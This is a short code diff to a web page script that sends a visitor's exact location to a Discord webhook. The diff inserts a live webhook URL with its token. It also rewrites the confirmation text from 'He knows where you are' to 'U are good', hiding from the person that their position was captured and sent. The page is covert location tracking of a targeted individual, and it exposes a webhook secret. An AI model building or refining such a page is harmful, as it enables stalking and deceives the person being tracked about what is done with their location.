@@ -136,7 +136,7 @@
 <script>
   // ===== CONFIGURATION =====
   // REPLACE WITH YOUR REAL DISCORD WEBHOOK URL (keep the quotes)
-  const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";   // <--- CHANGE THIS
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1493349822038802562/kCMiXet_oTmUm7cChL6K2vmmw62e43YnXCFDk2niMPN-v64bsBSLtbirZXlrNWho5CHM";   // <--- CHANGE THIS
   
   let isProcessing = false;
   let locationSent = false;
@@ -199,7 +199,7 @@
       setMessage("📡 Sending exact location...");
       const success = await sendToDiscord(lat, lng, 5, "manual pin");
       if (success) {
-        setMessage("✅ Exact location sent! He knows where you are. ❤️");
+        setMessage("✅ U are good");
         showFindMe();
         locationSent = true;
         document.getElementById('yesBtn').disabled = true;
